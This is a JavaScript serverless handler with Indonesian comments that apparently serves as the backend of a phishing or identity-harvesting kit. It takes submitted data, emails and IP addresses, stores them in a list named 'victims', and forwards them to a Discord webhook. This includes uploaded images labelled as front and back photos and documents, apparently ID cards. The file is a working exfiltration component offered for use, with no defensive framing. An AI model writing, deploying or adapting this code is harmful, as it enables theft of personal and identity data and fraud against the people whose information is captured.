import { kv } from '@vercel/kv';

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    const { type, data, email } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();
    
    const record = { type, email, data, ip, timestamp };
    
    // Simpan ke KV
    try {
        await kv.lpush('victims', JSON.stringify(record));
    } catch (e) {
        console.error('KV error:', e);
    }
    
    // Kirim ke Discord
    if (type === 'photo_front' || type === 'photo_back' || type === 'document') {
        // Kirim gambar ke Discord
        const base64Data = data.image ? data.image.split(',')[1] : data.data.split(',')[1];
        const buffer = Buffer.from(base64Data, 'base64');
        
        const formData = new FormData();
        formData.append('file', new Blob([buffer]), `${type}_${Date.now()}.jpg`);
        formData.append('content', `📸 **${type}** dari ${email || 'unknown'}\nIP: ${ip}`);
        
        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    } else {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `📌 **${type}** dari ${email || 'unknown'}\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\nIP: ${ip}`
            })
        });
    }
    
    return res.status(200).json({ status: 'ok' });
}
